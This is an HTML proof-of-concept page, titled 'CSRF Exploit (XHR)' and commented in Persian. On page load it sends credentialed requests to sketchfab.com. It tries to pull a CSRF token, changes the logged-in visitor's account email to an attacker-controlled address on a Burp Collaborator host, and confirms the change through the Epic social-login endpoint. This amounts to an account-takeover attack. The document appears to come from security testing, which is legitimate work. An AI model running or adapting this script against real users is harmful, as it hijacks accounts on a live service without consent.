<!DOCTYPE html>
<html>
<head>
    <title>CSRF Exploit (XHR)</title>
</head>
<body>
    <h1>Processing...</h1>
    <p id="status">Initializing...</p>

    <script>
        // تابع کمکی برای تأخیر
        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        // تابع برای اجرای درخواست GET با XHR و استخراج sb_csrftoken از Set-Cookie
        function extractCsrfTokenFromSetCookie() {
            return new Promise((resolve, reject) => {
                const xhr = new XMLHttpRequest();
                xhr.open('GET', 'https://sketchfab.com/settings/email', true);
                xhr.withCredentials = true;  // ارسال کوکی‌ها
                xhr.setRequestHeader('Accept', 'text/html,application/xhtml+xml');

                xhr.onreadystatechange = function() {
                    if (xhr.readyState === XMLHttpRequest.DONE) {
                        if (xhr.status === 200) {
                            // دریافت هدر Set-Cookie
                            const setCookieHeader = xhr.getResponseHeader('set-cookie');
                            if (!setCookieHeader) {
                                reject(new Error('Set-Cookie header not found in response'));
                                return;
                            }
                            // استخراج sb_csrftoken با رجکس
                            const match = setCookieHeader.match(/sb_csrftoken=([^;]+)/);
                            if (match && match[1]) {
                                resolve(match[1]);
                                console.log(match);
                            } else {
                                reject(new Error('sb_csrftoken not found in Set-Cookie header'));
                            }
                        } else {
                            reject(new Error(`GET request failed with status ${xhr.status}`));
                        }
                    }
                };
                xhr.onerror = () => reject(new Error('Network error on GET request'));
                xhr.send();
            });
        }

        // تابع برای درخواست POST اول (تغییر ایمیل)
        function changeEmail(csrfToken, emailAddress) {
            return new Promise((resolve, reject) => {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', 'https://sketchfab.com/settings/email/sso-verify-callback', true);
                xhr.withCredentials = true;
                xhr.setRequestHeader('Content-Type', 'application/json');
                xhr.setRequestHeader('X-Csrftoken', csrfToken);

                xhr.onreadystatechange = function() {
                    if (xhr.readyState === XMLHttpRequest.DONE) {
                        if (xhr.status === 200) {
                            try {
                                const response = JSON.parse(xhr.responseText);
                                if (response.success === true) {
                                    resolve(true);
                                } else {
                                    reject(new Error('Response success is false'));
                                }
                            } catch (e) {
                                reject(new Error('Invalid JSON response'));
                            }
                        } else {
                            reject(new Error(`POST changeEmail failed with status ${xhr.status}`));
                        }
                    }
                };
                xhr.onerror = () => reject(new Error('Network error on changeEmail'));
                const payload = JSON.stringify({ email: emailAddress });
                xhr.send(payload);
            });
        }

        // تابع برای درخواست POST دوم (تایید از طریق epic)
        function confirmEmail(csrfToken) {
            return new Promise((resolve, reject) => {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', 'https://sketchfab.com/social/login/epic/', true);
                xhr.withCredentials = true;
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

                xhr.onreadystatechange = function() {
                    if (xhr.readyState === XMLHttpRequest.DONE) {
                        // ریدایرکت 302 توسط XHR خودکار دنبال می‌شود، بنابراین status نهایی 200 خواهد بود
                        // اگر به دامنه دیگری ریدایرکت شود و CORS مانع شود، خطا می‌دهد.
                        // در اینجا هر status 2xx یا حتی 302 (اگر ریدایرکت کامل نشود) را موفق در نظر می‌گیریم.
                        if (xhr.status >= 200 && xhr.status < 400) {
                            resolve(true);
                        } else {
                            reject(new Error(`POST confirmEmail failed with status ${xhr.status}`));
                        }
                    }
                };
                xhr.onerror = () => reject(new Error('Network error on confirmEmail'));

                const params = new URLSearchParams({
                    'csrfmiddlewaretoken': csrfToken,
                    'next': '/settings/email/sso-verify-callback'
                });
                xhr.send(params.toString());
            });
        }

        // اجرای اصلی زنجیره
        (async function() {
            try {
                const statusDiv = document.getElementById('status');
                statusDiv.innerText = 'Extracting CSRF token from Set-Cookie header...';
                const csrfToken = await extractCsrfTokenFromSetCookie();
                console.log('[+] CSRF token extracted:', csrfToken);
                statusDiv.innerText = 'Token extracted. Sending email change request...';

                // آدرس ایمیل جدید همراه با Collaborator خود را جایگزین کنید
                const emailAddress = 'pouryet3@gmail.com.gzjkg2psu523o7ao6del6o1ib9h050tp.oastify.com'; // 👈 تغییر دهید
                await changeEmail(csrfToken, emailAddress);
                console.log('[+] Email change request sent successfully');
                statusDiv.innerText = 'Email change initiated. Waiting 2 seconds...';
                await delay(2000);

                statusDiv.innerText = 'Sending confirmation request...';
                await confirmEmail(csrfToken);
                console.log('[+] Confirmation request completed');
                statusDiv.innerText = 'Exploit completed!';
                document.body.innerHTML = '<h2 style="color:green">Success! Email address changed.</h2>';
            } catch (err) {
                console.error('[-] Exploit error:', err);
                document.getElementById('status').innerText = 'Error: ' + err.message;
                document.body.innerHTML += '<p style="color:red">Exploit failed. Check console.</p>';
            }
        })();
    </script>
</body>
</html>
